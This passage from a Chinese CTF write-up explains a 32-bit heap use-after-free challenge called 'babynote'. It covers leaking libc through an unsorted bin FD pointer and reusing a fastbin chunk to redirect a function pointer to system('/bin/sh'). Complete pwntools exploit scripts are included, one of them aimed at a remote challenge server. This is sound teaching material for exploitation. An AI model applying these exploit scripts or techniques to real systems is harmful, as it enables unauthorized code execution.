puts_addr - (libc.symbols['puts']-libc.symbols['system'])print "sys_addr:0x%x" %system_addr#edit 100p.recvuntil('please input your choice:')p.sendline('2')p.recvuntil("Node's value:")p.sendline(str(puts_addr))p.recvuntil('New value:')p.sendline(str(system_addr))p.recvuntil('New data:')p.sendline(p32(system_addr))#listp.recvuntil('please input your choice:')p.sendline('3')p.interactive() babynote基本逻辑菜单类的题目，可以添加、编辑、删除和打印note。 add函数限定了note数量最多为3。通过add函数，能够看出程序管理每一块note的方法：有一个list数组用于存放每一个note的首地址，每一个note的大小是12字节，依次存放note中content的大小、content的地址和puts函数地址。 edit函数通过note的编号作为索引修改content的内容。 prints函数调用每一个note中的第三个字段（正常来说是puts函数地址）来打印每一个note的内容。 delete函数释放note的content地址空间和note地址空间，然而并没有将指针置0. 漏洞在delete函数中，被释放的指针没有置空，导致UAF（use after free）漏洞，即可以对已释放的内继续进行操作。 漏洞利用非常不巧，本题开了PIE保护，即程序的地址也不再是固定不变的了，漏洞的利用变得更加困难。 system函数的地址泄露： 涉及了一个新的知识点：main_arena。main_arena存在于libc的BSS段中，用于存放各种bin的头结点信息，如fastbin，smallbin和unsortedbin等。本题中，当最开始add了一个note，并设置content大小为一个大于64字节的数（例如100），再delete这个note时，这一块内存会首先放入unsortedbin当中，并将FD和BK设置为main_arena中unsortedbin的头结点地址。 可以通过调试查看，在100字节的content没有被释放时，main_arena的结构是这样的： 释放这个note之后，main_arena如下： 其中bins里存放的就是各类型的bin头结点的地址，发现0x5824b010就是unsortedbin头结点的地址，查看0x5824b010，就能看见刚刚释放的content 地址。 因此，system函数的地址泄露可以通过读取已释放的content的前四字节（FD指针）泄露libc的地址，进而泄露system的地址。 system函数的覆写和调用： 本题中note固定占用12字节，属于fastbin。当某一content正好也要申请12字节空间时，系统会先再fastbin上寻找是否有大小相同的chunk，如果有就会直接分配给content。如果这个chunk是之前释放的note，那么利用UAF漏洞，就可以修改内存。 先申请第一个note(note#0)，其content大小为100字节。再申请第二个note(note#1)，其content(content#1)大小为12字节。释放note #1和note #0。由于fastbin是LIFO的原则，此时fastbin上的chunk顺序为：note#0-&gt;note#1-&gt;content#1。此时再申请第三个note(note #2)，并要求content也为12，系统从fastbin中顺序摘下大小为12的chunk进行分配，那么note#2对应的就是note#0，content#2对应的就是note #1。 此时向content#2输入，就会覆写掉note#1原本的内容，将前两个字段写成/bin/sh，第三个字段写成system函数地址；然后再调用prints对note#1操作，就相当于直接调用了system函数。 PS:在调试过程中可以通过vmmap来查看，FD指针与libc其实地址的相对偏移offset。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *context.log_level='debug'debug = 0if debug: p = process('./babynote') libc = ELF('./libc.local.so')else: p = remote('111.230.132.82',40004) libc = ELF('./libc.so.6')offset = 0x1b27b0def add(size,content): p.recvuntil("Your choice :") p.sendline('1') p.recvuntil("Content size:") p.sendline(str(size)) p.recvuntil("Input the content:") p.sendline(content)def delete(index): p.recvuntil("Your choice :") p.sendline('4') p.recvuntil("Input the index:") p.sendline(str(index))def edit(index,content): p.recvuntil("Your choice :") p.sendline('2') p.recvuntil("Input the index:") p.sendline(str(index)) p.recvuntil("New content:") p.sendline(content)def prints(index): p.recvuntil("Your choice :") p.sendline('3') p.recvuntil("Input the index:") p.sendline(str(index))#0add(100,'a'*4)#1add(12,'/bin/sh')delete(1)delete(0)prints(1)prints(0)addr = u32(p.recv(4))print "addr:0x%x" %addrlibc_base = addr - offsetsys_addr = libc_base+libc.symbols['system']print "sys:0x%x"%sys_addr#2add(12,'c'*4)edit(2,'/bin/sh\0'+p32(sys_addr))prints(1)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
